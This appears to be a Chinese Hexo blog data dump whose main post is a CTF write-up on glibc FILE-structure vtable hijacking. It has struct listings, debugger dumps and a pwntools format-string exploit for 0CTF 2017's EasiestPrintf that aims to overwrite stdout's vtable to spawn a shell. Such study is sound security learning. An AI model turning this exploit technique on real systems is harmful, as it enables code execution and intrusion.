class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">float</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">2</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> sum = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;n);</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n != <span class=\"number\">0</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tsum = <span class=\"number\">0</span>;</div><div class=\"line\">\t\ti = <span class=\"number\">2</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (sum &lt; n)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tsum += <span class=\"number\">1.0</span> / (<span class=\"keyword\">float</span>)i;</div><div class=\"line\">\t\t\ti++;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d card(s)\\n\"</span>, i - <span class=\"number\">2</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%f\"</span>, &amp;n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"Pwn中的沙盒","date":"2017-04-11T05:38:09.000Z","_content":"\n## 什么是沙盒\n\n来来来，开个坑，以后慢慢填","source":"_posts/Pwn中的沙盒.md","raw":"---\ntitle: Pwn中的沙盒\ntags:\n  - PWN\n  - sandbox\ncategories: []\ndate: 2017-04-11 13:38:09\n---\n\n## 什么是沙盒\n\n来来来，开个坑，以后慢慢填","slug":"Pwn中的沙盒","published":1,"updated":"2017-04-11T05:39:09.088Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k1d0037hv18y8xj8enh","content":"<h2 id=\"什么是沙盒\"><a href=\"#什么是沙盒\" class=\"headerlink\" title=\"什么是沙盒\"></a>什么是沙盒</h2><p>来来来，开个坑，以后慢慢填</p>\n","excerpt":"","more":"<h2 id=\"什么是沙盒\"><a href=\"#什么是沙盒\" class=\"headerlink\" title=\"什么是沙盒\"></a>什么是沙盒</h2><p>来来来，开个坑，以后慢慢填</p>\n"},{"title":"Pwn的FILE结构体","date":"2017-04-14T02:27:39.000Z","_content":"\n## 前言\n\n神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。\n(╯‵□′)╯︵┻━┻\n(╯‵□′)╯︵┻━┻\n(╯‵□′)╯︵┻━┻\n好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。\n\n## FILE结构体\n\n首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。\n\n以下所有关键词搜索命令为\n`grep -rn \"struct _IO_FILE {\" --include=\"*.h\" /usr/include`\n\n其中`_IO_2_1_stdout_`的结构体如下：\n\n`glibc-2.24/libio/libio.h`\n```\nextern struct _IO_FILE_plus _IO_2_1_stdin_;\nextern struct _IO_FILE_plus _IO_2_1_stdout_;\nextern struct _IO_FILE_plus _IO_2_1_stderr_;\n```\n\n我们查看`_IO_FILE_plus`的结构体定义\n`/root/desktop/glibc-2.24/libio/libioP.h`\n```\n/* We always allocate an extra word following an _IO_FILE.\n   This contains a pointer to the function jump table used.\n   This is for compatibility with C++ streambuf; the word can\n   be used to smash to a pointer to a virtual function table. */\n\nstruct _IO_FILE_plus\n{\n  _IO_FILE file;\n  const struct _IO_jump_t *vtable;\n};\n```\n这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。\n\n下面来查看两个关键结构`_IO_FILE`和`_IO_jump_t`：\n`_IO_FILE`在`/usr/include/libio.h`中\n```\nstruct _IO_FILE {\n  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;\t/* Current read pointer */\n  char* _IO_read_end;\t/* End of get area. */\n  char* _IO_read_base;\t/* Start of putback+get area. */\n  char* _IO_write_base;\t/* Start of put area. */\n  char* _IO_write_ptr;\t/* Current put pointer. */\n  char* _IO_write_end;\t/* End of put area. */\n  char* _IO_buf_base;\t/* Start of reserve area. */\n  char* _IO_buf_end;\t/* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n`_IO_jump_t`在`/root/desktop/glibc-2.24/libio/fileops.c`中\n```\nconst struct _IO_jump_t _IO_file_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_file_finish),\n  JUMP_INIT(overflow, _IO_file_overflow),\n  JUMP_INIT(underflow, _IO_file_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n  JUMP_INIT(xsputn, _IO_file_xsputn),\n  JUMP_INIT(xsgetn, _IO_file_xsgetn),\n  JUMP_INIT(seekoff, _IO_new_file_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_new_file_setbuf),\n  JUMP_INIT(sync, _IO_new_file_sync),\n  JUMP_INIT(doallocate, _IO_file_doallocate),\n  JUMP_INIT(read, _IO_file_read),\n  JUMP_INIT(write, _IO_new_file_write),\n  JUMP_INIT(seek, _IO_file_seek),\n  JUMP_INIT(close, _IO_file_close),\n  JUMP_INIT(stat, _IO_file_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n再结合gdb查看内存能够得到更直观的理解：\n```\nwndbg> telescope 0xf771fd60 40\n00:0000│   0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887\n01:0004│   0xf771fd64 (_IO_2_1_stdout_+4) —▸ 0xf771fda7 (_IO_2_1_stdout_+71) ◂— 0x7208700a\n... ↓\n08:0020│   0xf771fd80 (_IO_2_1_stdout_+32) —▸ 0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0\n09:0024│   0xf771fd84 (_IO_2_1_stdout_+36) ◂— 0x0\n... ↓\n0d:0034│   0xf771fd94 (_IO_2_1_stdout_+52) —▸ 0xf771f5a0 (_IO_2_1_stdin_) ◂— 0xfbad208b\n0e:0038│   0xf771fd98 (_IO_2_1_stdout_+56) ◂— 0x1\n0f:003c│   0xf771fd9c (_IO_2_1_stdout_+60) ◂— 0x0\n10:0040│   0xf771fda0 (_IO_2_1_stdout_+64) ◂— 0xffffffff\n11:0044│   0xf771fda4 (_IO_2_1_stdout_+68) ◂— 0xa000000\n12:0048│   0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0\n13:004c│   0xf771fdac (_IO_2_1_stdout_+76) ◂— 0xffffffff\n... ↓\n15:0054│   0xf771fdb4 (_IO_2_1_stdout_+84) ◂— 0x0\n16:0058│   0xf771fdb8 (_IO_2_1_stdout_+88) —▸ 0xf771f4e0 ◂— 0x0\n17:005c│   0xf771fdbc (_IO_2_1_stdout_+92) ◂— 0x0\n... ↓\n1a:0068│   0xf771fdc8 (_IO_2_1_stdout_+104) ◂— 0xffffffff\n1b:006c│   0xf771fdcc (_IO_2_1_stdout_+108) ◂— 0x0\n... ↓\n25:0094│   0xf771fdf4 (_IO_2_1_stdout_+148) —▸ 0xf771d960 (_IO_file_jumps) ◂— 0x0\n26:0098│   0xf771fdf8 (stderr) —▸ 0xf771fcc0 (_IO_2_1_stderr_) ◂— 0xfbad2087\n27:009c│   0xf771fdfc (stdout) —▸ 0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887\npwndbg> telescope 0xf771d960 30\n00:0000│   0xf771d960 (_IO_file_jumps) ◂— 0x0\n... ↓\n02:0008│   0xf771d968 (_IO_file_jumps+8) —▸ 0xf75d6040 (_IO_file_finish) ◂— push   edi\n03:000c│   0xf771d96c (_IO_file_jumps+12) —▸ 0xf75d6b00 (_IO_file_overflow) ◂— push   ebp\n04:0010│   0xf771d970 (_IO_file_jumps+16) —▸ 0xf75d6810 (_IO_file_underflow) ◂— push   ebp\n05:0014│   0xf771d974 (_IO_file_jumps+20) —▸ 0xf75d7a40 (_IO_default_uflow) ◂— push   esi\n06:0018│   0xf771d978 (_IO_file_jumps+24) —▸ 0xf75d8b50 (_IO_default_pbackfail) ◂— push   ebp\n07:001c│   0xf771d97c (_IO_file_jumps+28) —▸ 0xf75d5c50 (_IO_file_xsputn) ◂— push   ebp\n08:0020│   0xf771d980 (_IO_file_jumps+32) —▸ 0xf75d5790 ◂— push   ebp\n09:0024│   0xf771d984 (_IO_file_jumps+36) —▸ 0xf75d4730 (_IO_file_seekoff) ◂— push   ebp\n0a:0028│   0xf771d988 (_IO_file_jumps+40) —▸ 0xf75d7dd0 ◂— push   ebp\n0b:002c│   0xf771d98c (_IO_file_jumps+44) —▸ 0xf75d44b0 (_IO_file_setbuf) ◂— push   esi\n0c:0030│   0xf771d990 (_IO_file_jumps+48) —▸ 0xf75d4300 (_IO_file_sync) ◂— push   ebp\n0d:0034│   0xf771d994 (_IO_file_jumps+52) —▸ 0xf75c93b0 (_IO_file_doallocate) ◂— push   ebp\n0e:0038│   0xf771d998 (_IO_file_jumps+56) —▸ 0xf75d5c00 (_IO_file_read) ◂— push   esi\n0f:003c│   0xf771d99c (_IO_file_jumps+60) —▸ 0xf75d55b0 (_IO_file_write) ◂— push   ebp\n10:0040│   0xf771d9a0 (_IO_file_jumps+64) —▸ 0xf75d5210 (_IO_file_seek) ◂— push   ebx\n11:0044│   0xf771d9a4 (_IO_file_jumps+68) —▸ 0xf75d4480 (_IO_file_close) ◂— push   ebx\n12:0048│   0xf771d9a8 (_IO_file_jumps+72) —▸ 0xf75d5590 (_IO_file_stat) ◂— sub    esp, 0x10\n13:004c│   0xf771d9ac (_IO_file_jumps+76) —▸ 0xf75d8ce0 ◂— mov    eax, 0xffffffff\n14:0050│   0xf771d9b0 (_IO_file_jumps+80) —▸ 0xf75d8cf0 ◂— ret    \n```\n\n## 利用原理\n\n我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改`signed char _vtable_offset`使其指向一个我们伪造的虚表，那么我们就可以控制eip。\n\n利用思路：\n1. 控制`_IO_FILE_plus`或`_IO_FILE`结构体的`signed char _vtable_offset`偏移使其指向我们伪造的虚表。\n2. 伪造虚表中函数为我们希望程序调用的函数如`system`\n\n利用条件：\n1. 可泄露`libc`基址\n2. 有一次任意地址写的机会\n3. 存在一个我们知道地址的可控区域\n\n## 例题\n\n下面用20170ctf的Easyprintf来为例分析\n\n> 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的`_IO_2_1_stdout_`结构的虚表，因为`printf`在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为`system`，而这个结构自身会作为参数传入，覆盖虚表之后将一个`sh\\0\\0`写到整个结构头部即可。\n\n先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./EasiestPrintf')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./EasiestPrintf')\nlibc = ELF('/lib32/libc.so.6')\nbss_addr = elf.bss\n_IO_stdout_got = 0x0804A044\n\n'''\ndef exe_fmt(payload):\n    p = process('./EasiestPrintf')\n    p.recvuntil('read:\\n')\n    p.sendline(str(_IO_stdout_addr))\n    p.recvuntil('Good Bye\\n')\n    p.sendline(payload)\n    return p.recvall()\n'''\ndef pwn():\n    p.recvuntil('read:\\n')\n    p.sendline(str(_IO_stdout_got))\n    _IO_stdout_addr = int(p.recvline(), 16)\n    p.recvline('Good Bye\\n')\n    print '_IO_stdout_addr => ', hex(_IO_stdout_addr)\n    libc.address = _IO_stdout_addr - libc.symbols['_IO_2_1_stdout_']\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n    _IO_file_jumps_addr = libc.symbols['_IO_file_jumps']\n    print '_IO_file_jumps => ', hex(libc.symbols['_IO_file_jumps'])\n#    gdb.attach(p, open('debug'))\n    \n    def exe_fmt(payload):\n        p = process('./EasiestPrintf')\n        p.recvuntil('read:\\n')\n        p.sendline(str(_IO_stdout_got))\n        p.recvuntil('Good Bye\\n')\n        p.sendline(payload)\n        return p.recvall()\n    fmt = FmtStr(exe_fmt)  # init\n    # _IO_stdout_addr = 'sh\\x00\\x00'\n    # _IO_stdout_addr - 4 = &system\n    # _IO_stdout_vtable+0x1c = &(libc_stdout-4)       _IO_file_xsputn\n    writes = {_IO_stdout_addr:26739-16, # 'sh\\x00\\x00'\n            _IO_stdout_addr-4:system_addr,\n            _IO_file_jumps_addr+0x1c:_IO_stdout_addr-4}\n    payload = fmtstr_payload(fmt.offset, writes, 0, 'byte')\n    p.sendline(payload)\n    \nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n最后的payload使180长度，但是最大长度是158- -。。\n\n## 关于FmtStr\n\npwntools中的fmtstr还是很有趣的，唯一的不足就是生成的payload太长了- -因为据观察完全是用`hhn`来修改的（因为只能指定一个只能为`hhn`or`hn`or`n`中的一种来生成payload），大概是作者懒了没想设计别的算法把- -\n\n先看下给出的example\n```\n>>> program = tempfile.mktemp()\n>>> source  = program + \".c\"\n>>> write(source, '''\n... #include <stdio.h>\n... #include <stdlib.h>\n... #include <unistd.h>\n... #include <sys/mman.h>\n... #define MEMORY_ADDRESS ((void*)0x11111000)\n... #define MEMORY_SIZE 1024\n... #define TARGET ((int *) 0x11111110)\n... int main(int argc, char const *argv[])\n... {\n...        char buff[1024];\n...        void *ptr = NULL;\n...        int *my_var = TARGET;\n...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);\n...        if(ptr != MEMORY_ADDRESS)\n...        {\n...                perror(\"mmap\");\n...                return EXIT_FAILURE;\n...        }\n...        *my_var = 0x41414141;\n...        write(1, &my_var, sizeof(int *));\n...        scanf(\"%s\", buff);\n...        dprintf(2, buff);\n...        write(1, my_var, sizeof(int));\n...        return 0;\n... }''')\n>>> cmdline = [\"gcc\", source, \"-Wno-format-security\", \"-m32\", \"-o\", program]\n>>> process(cmdline).wait_for_close()\n>>> def exec_fmt(payload):\n...     p = process(program)\n...     p.sendline(payload)\n...     return p.recvall()\n...\n>>> autofmt = FmtStr(exec_fmt)\n>>> offset = autofmt.offset\n>>> p = process(program, stderr=PIPE)\n>>> addr = unpack(p.recv(4))\n>>> payload = fmtstr_payload(offset, {addr: 0x1337babe})\n>>> p.sendline(payload)\n>>> print hex(unpack(p.recv(4)))\n0x1337babe\n```\n\n主要就是一个类，一个函数：\n`class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)`\n`pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str`\n\n其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。\n+ execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息\n+ offset 偏移，没有给出的话会通过栈泄露自动给出\n+ padlen payload之前填充的字符数\n+ numbwritem 生成的此payload（包括填充）之前的偏移量\n\n看了看源码，发现`成员名`和`参数名`是同名的，直接调用即可。我们其实可以主要用这个来得到`FmtStr.offset`即可。\n实例化一个类后，通过`write(addr, data) `来控制想要修改的地址和数据，可以通过一个字典来传参**（data(int)）**。\n最后通过`execute_writes() `方法来调用`fmtstr_payload`生成payload并发送出去。\n\n我们也可以直接调用`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')`这个方法来只生成payload。\n给下参数，没啥特别的\n+ offset (int) – the first formatter’s offset you control\n+ writes (dict) – dict with addr, value {addr: value, addr2: value2}\n+ numbwritten (int) – number of byte already written by the printf function\n+ write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)","source":"_posts/Pwn的FILE结构体.md","raw":"---\ntitle: Pwn的FILE结构体\ntags:\n  - PWN\n  - FILE\ncategories: []\ndate: 2017-04-14 10:27:39\n---\n\n## 前言\n\n神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的编辑器坑啊。。\n(╯‵□′)╯︵┻━┻\n(╯‵□′)╯︵┻━┻\n(╯‵□′)╯︵┻━┻\n好了回到FILE结构体这个问题上来。由于两次碰见这个东西了，意识到似乎比赛中开始多了起来，于是趁热学习下，提高自己的姿势水平。\n\n## FILE结构体\n\n首先我们知道linux中遵循“所有接口皆文件”的原则，输入输出做成了文件的形式。\n\n以下所有关键词搜索命令为\n`grep -rn \"struct _IO_FILE {\" --include=\"*.h\" /usr/include`\n\n其中`_IO_2_1_stdout_`的结构体如下：\n\n`glibc-2.24/libio/libio.h`\n```\nextern struct _IO_FILE_plus _IO_2_1_stdin_;\nextern struct _IO_FILE_plus _IO_2_1_stdout_;\nextern struct _IO_FILE_plus _IO_2_1_stderr_;\n```\n\n我们查看`_IO_FILE_plus`的结构体定义\n`/root/desktop/glibc-2.24/libio/libioP.h`\n```\n/* We always allocate an extra word following an _IO_FILE.\n   This contains a pointer to the function jump table used.\n   This is for compatibility with C++ streambuf; the word can\n   be used to smash to a pointer to a virtual function table. */\n\nstruct _IO_FILE_plus\n{\n  _IO_FILE file;\n  const struct _IO_jump_t *vtable;\n};\n```\n这里也解释了之所以下面加上函数指针，做成类似虚表的形式，是为了与C++的流兼容。\n\n下面来查看两个关键结构`_IO_FILE`和`_IO_jump_t`：\n`_IO_FILE`在`/usr/include/libio.h`中\n```\nstruct _IO_FILE {\n  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;\t/* Current read pointer */\n  char* _IO_read_end;\t/* End of get area. */\n  char* _IO_read_base;\t/* Start of putback+get area. */\n  char* _IO_write_base;\t/* Start of put area. */\n  char* _IO_write_ptr;\t/* Current put pointer. */\n  char* _IO_write_end;\t/* End of put area. */\n  char* _IO_buf_base;\t/* Start of reserve area. */\n  char* _IO_buf_end;\t/* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n```\n\n`_IO_jump_t`在`/root/desktop/glibc-2.24/libio/fileops.c`中\n```\nconst struct _IO_jump_t _IO_file_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_file_finish),\n  JUMP_INIT(overflow, _IO_file_overflow),\n  JUMP_INIT(underflow, _IO_file_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n  JUMP_INIT(xsputn, _IO_file_xsputn),\n  JUMP_INIT(xsgetn, _IO_file_xsgetn),\n  JUMP_INIT(seekoff, _IO_new_file_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_new_file_setbuf),\n  JUMP_INIT(sync, _IO_new_file_sync),\n  JUMP_INIT(doallocate, _IO_file_doallocate),\n  JUMP_INIT(read, _IO_file_read),\n  JUMP_INIT(write, _IO_new_file_write),\n  JUMP_INIT(seek, _IO_file_seek),\n  JUMP_INIT(close, _IO_file_close),\n  JUMP_INIT(stat, _IO_file_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n再结合gdb查看内存能够得到更直观的理解：\n```\nwndbg> telescope 0xf771fd60 40\n00:0000│   0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887\n01:0004│   0xf771fd64 (_IO_2_1_stdout_+4) —▸ 0xf771fda7 (_IO_2_1_stdout_+71) ◂— 0x7208700a\n... ↓\n08:0020│   0xf771fd80 (_IO_2_1_stdout_+32) —▸ 0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0\n09:0024│   0xf771fd84 (_IO_2_1_stdout_+36) ◂— 0x0\n... ↓\n0d:0034│   0xf771fd94 (_IO_2_1_stdout_+52) —▸ 0xf771f5a0 (_IO_2_1_stdin_) ◂— 0xfbad208b\n0e:0038│   0xf771fd98 (_IO_2_1_stdout_+56) ◂— 0x1\n0f:003c│   0xf771fd9c (_IO_2_1_stdout_+60) ◂— 0x0\n10:0040│   0xf771fda0 (_IO_2_1_stdout_+64) ◂— 0xffffffff\n11:0044│   0xf771fda4 (_IO_2_1_stdout_+68) ◂— 0xa000000\n12:0048│   0xf771fda8 (_IO_2_1_stdout_+72) —▸ 0xf7720870 ◂— 0x0\n13:004c│   0xf771fdac (_IO_2_1_stdout_+76) ◂— 0xffffffff\n... ↓\n15:0054│   0xf771fdb4 (_IO_2_1_stdout_+84) ◂— 0x0\n16:0058│   0xf771fdb8 (_IO_2_1_stdout_+88) —▸ 0xf771f4e0 ◂— 0x0\n17:005c│   0xf771fdbc (_IO_2_1_stdout_+92) ◂— 0x0\n... ↓\n1a:0068│   0xf771fdc8 (_IO_2_1_stdout_+104) ◂— 0xffffffff\n1b:006c│   0xf771fdcc (_IO_2_1_stdout_+108) ◂— 0x0\n... ↓\n25:0094│   0xf771fdf4 (_IO_2_1_stdout_+148) —▸ 0xf771d960 (_IO_file_jumps) ◂— 0x0\n26:0098│   0xf771fdf8 (stderr) —▸ 0xf771fcc0 (_IO_2_1_stderr_) ◂— 0xfbad2087\n27:009c│   0xf771fdfc (stdout) —▸ 0xf771fd60 (_IO_2_1_stdout_) ◂— 0xfbad2887\npwndbg> telescope 0xf771d960 30\n00:0000│   0xf771d960 (_IO_file_jumps) ◂— 0x0\n... ↓\n02:0008│   0xf771d968 (_IO_file_jumps+8) —▸ 0xf75d6040 (_IO_file_finish) ◂— push   edi\n03:000c│   0xf771d96c (_IO_file_jumps+12) —▸ 0xf75d6b00 (_IO_file_overflow) ◂— push   ebp\n04:0010│   0xf771d970 (_IO_file_jumps+16) —▸ 0xf75d6810 (_IO_file_underflow) ◂— push   ebp\n05:0014│   0xf771d974 (_IO_file_jumps+20) —▸ 0xf75d7a40 (_IO_default_uflow) ◂— push   esi\n06:0018│   0xf771d978 (_IO_file_jumps+24) —▸ 0xf75d8b50 (_IO_default_pbackfail) ◂— push   ebp\n07:001c│   0xf771d97c (_IO_file_jumps+28) —▸ 0xf75d5c50 (_IO_file_xsputn) ◂— push   ebp\n08:0020│   0xf771d980 (_IO_file_jumps+32) —▸ 0xf75d5790 ◂— push   ebp\n09:0024│   0xf771d984 (_IO_file_jumps+36) —▸ 0xf75d4730 (_IO_file_seekoff) ◂— push   ebp\n0a:0028│   0xf771d988 (_IO_file_jumps+40) —▸ 0xf75d7dd0 ◂— push   ebp\n0b:002c│   0xf771d98c (_IO_file_jumps+44) —▸ 0xf75d44b0 (_IO_file_setbuf) ◂— push   esi\n0c:0030│   0xf771d990 (_IO_file_jumps+48) —▸ 0xf75d4300 (_IO_file_sync) ◂— push   ebp\n0d:0034│   0xf771d994 (_IO_file_jumps+52) —▸ 0xf75c93b0 (_IO_file_doallocate) ◂— push   ebp\n0e:0038│   0xf771d998 (_IO_file_jumps+56) —▸ 0xf75d5c00 (_IO_file_read) ◂— push   esi\n0f:003c│   0xf771d99c (_IO_file_jumps+60) —▸ 0xf75d55b0 (_IO_file_write) ◂— push   ebp\n10:0040│   0xf771d9a0 (_IO_file_jumps+64) —▸ 0xf75d5210 (_IO_file_seek) ◂— push   ebx\n11:0044│   0xf771d9a4 (_IO_file_jumps+68) —▸ 0xf75d4480 (_IO_file_close) ◂— push   ebx\n12:0048│   0xf771d9a8 (_IO_file_jumps+72) —▸ 0xf75d5590 (_IO_file_stat) ◂— sub    esp, 0x10\n13:004c│   0xf771d9ac (_IO_file_jumps+76) —▸ 0xf75d8ce0 ◂— mov    eax, 0xffffffff\n14:0050│   0xf771d9b0 (_IO_file_jumps+80) —▸ 0xf75d8cf0 ◂— ret    \n```\n\n## 利用原理\n\n我们平时调用文件族的函数的时候（包括一些输入输出），最后都会通过虚表来调用函数，如果我们可以通过修改`signed char _vtable_offset`使其指向一个我们伪造的虚表，那么我们就可以控制eip。\n\n利用思路：\n1. 控制`_IO_FILE_plus`或`_IO_FILE`结构体的`signed char _vtable_offset`偏移使其指向我们伪造的虚表。\n2. 伪造虚表中函数为我们希望程序调用的函数如`system`\n\n利用条件：\n1. 可泄露`libc`基址\n2. 有一次任意地址写的机会\n3. 存在一个我们知道地址的可控区域\n\n## 例题\n\n下面用20170ctf的Easyprintf来为例分析\n\n> 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的`_IO_2_1_stdout_`结构的虚表，因为`printf`在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为`system`，而这个结构自身会作为参数传入，覆盖虚表之后将一个`sh\\0\\0`写到整个结构头部即可。\n\n先放上没什么卵用但是应该是对的并且学到了东西的exp。。。。\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./EasiestPrintf')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./EasiestPrintf')\nlibc = ELF('/lib32/libc.so.6')\nbss_addr = elf.bss\n_IO_stdout_got = 0x0804A044\n\n'''\ndef exe_fmt(payload):\n    p = process('./EasiestPrintf')\n    p.recvuntil('read:\\n')\n    p.sendline(str(_IO_stdout_addr))\n    p.recvuntil('Good Bye\\n')\n    p.sendline(payload)\n    return p.recvall()\n'''\ndef pwn():\n    p.recvuntil('read:\\n')\n    p.sendline(str(_IO_stdout_got))\n    _IO_stdout_addr = int(p.recvline(), 16)\n    p.recvline('Good Bye\\n')\n    print '_IO_stdout_addr => ', hex(_IO_stdout_addr)\n    libc.address = _IO_stdout_addr - libc.symbols['_IO_2_1_stdout_']\n    system_addr = libc.symbols['system']\n    print 'system_addr => ', hex(system_addr)\n    _IO_file_jumps_addr = libc.symbols['_IO_file_jumps']\n    print '_IO_file_jumps => ', hex(libc.symbols['_IO_file_jumps'])\n#    gdb.attach(p, open('debug'))\n    \n    def exe_fmt(payload):\n        p = process('./EasiestPrintf')\n        p.recvuntil('read:\\n')\n        p.sendline(str(_IO_stdout_got))\n        p.recvuntil('Good Bye\\n')\n        p.sendline(payload)\n        return p.recvall()\n    fmt = FmtStr(exe_fmt)  # init\n    # _IO_stdout_addr = 'sh\\x00\\x00'\n    # _IO_stdout_addr - 4 = &system\n    # _IO_stdout_vtable+0x1c = &(libc_stdout-4)       _IO_file_xsputn\n    writes = {_IO_stdout_addr:26739-16, # 'sh\\x00\\x00'\n            _IO_stdout_addr-4:system_addr,\n            _IO_file_jumps_addr+0x1c:_IO_stdout_addr-4}\n    payload = 